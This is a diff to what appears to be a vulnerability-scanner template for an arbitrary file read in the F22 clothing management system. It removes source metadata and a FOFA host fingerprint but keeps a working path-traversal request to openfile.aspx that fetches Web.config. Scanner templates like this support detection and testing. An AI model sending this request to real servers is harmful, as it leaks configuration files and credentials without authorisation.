@@ -3,12 +3,8 @@ info:
   name: F22服装管理软件系统 openfile.aspx 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ogd6dz6dg5pbb7ou'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ogd6dz6dg5pbb7ou
-    fofa: body="b28web/Utility/"
 http:
 - raw:
   - 'GET /oa/isprit/module/openfile.aspx?Url=..\..\..\Web.config HTTP/1.1
@@ -23,10 +19,7 @@ http:
 
     Accept-Language: zh-CN,zh;q=0.9
 
-    Connection: keep-alive
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730351427470-37bb9744-8e09-427f-9667-ec615d989c88.png)'
+    Connection: keep-alive'
   redirects: false
   matchers:
   - status:
